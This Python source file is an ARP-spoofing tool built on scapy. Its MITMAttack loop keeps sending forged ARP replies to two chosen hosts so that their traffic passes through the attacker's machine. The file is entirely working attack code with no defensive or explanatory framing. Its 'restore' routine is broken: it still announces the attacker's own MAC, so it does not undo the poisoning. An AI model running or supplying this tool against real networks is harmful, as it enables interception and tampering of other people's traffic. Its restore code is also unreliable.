import time
from scapy import arch, config
from scapy.all import ARP
from scapy.sendrecv import send


class ARPSpoof:

    __target_one_ip: str
    __target_one_mac: str
    __target_two_ip: str
    __target_two_mac: str

    def __init__(self, **kwargs):
        self.__target_one_ip = kwargs["tOneIp"]
        self.__target_one_mac = kwargs["tOneMac"]
        self.__target_two_ip = kwargs["tTwoIp"]
        self.__target_two_mac = kwargs["tTwoMac"]

    def __attacker__(self) -> dict:
        return dict(
            Name=arch.get_working_if().name,
            Ip=arch.get_working_if().ip,
            Mac=arch.get_working_if().mac,
            Nic=arch.get_working_if().description
        )

    def spoof_target(self, ip: str, mac: str, fake_src: str) -> None:
        arp_request = ARP()
        arp_request.op = 2
        arp_request.pdst = ip
        arp_request.hwdst = mac
        arp_request.hwsrc = self.__attacker__()['Mac']
        arp_request.psrc = fake_src

        send(arp_request)

    def restore_ARP_tables(self, times=1) -> None:
        if times > 2:
            return

        ip = self.__target_one_ip if times == 1 else self.__target_two_ip
        mac = self.__target_one_mac if times == 1 else self.__target_two_mac
        src = self.__target_two_ip if times == 1 else self.__target_one_ip

        arp_response = ARP()
        arp_response.op = 2
        arp_response.pdst = ip
        arp_response.hwdst = mac
        arp_response.hwsrc = self.__attacker__()['Mac']
        arp_response.psrc = src
        send(arp_response)
        times += 1
        self.restore_ARP_tables(times)

    def MITMAttack(self) -> None:
        try:
            while True:
                self.spoof_target(self.__target_one_ip,
                                  self.__target_one_mac, self.__target_two_ip)
                self.spoof_target(self.__target_two_ip,
                                  self.__target_two_mac, self.__target_one_ip)
                time.sleep(2)
        except KeyboardInterrupt as err:
            print("Restoring ARP tables")
            self.restore_ARP_tables()
            print("Exiting...")
